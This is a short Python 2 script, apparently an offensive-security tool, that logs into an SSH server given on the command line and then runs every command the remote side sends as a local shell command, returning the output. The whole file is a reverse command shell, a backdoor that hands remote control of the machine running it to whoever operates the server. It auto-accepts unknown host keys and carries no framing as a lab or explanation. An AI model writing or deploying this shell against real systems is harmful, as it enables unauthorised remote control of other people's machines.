import threading
import paramiko #pip install paramiko
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return

def main():
    if len(sys.argv[1:]) != 4:
        print "Usage ./sshClient.py [ip] [user] [password] [command]"
        sys.exit(0)
    print sys.argv[1:]
    ssh_command(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])   
main()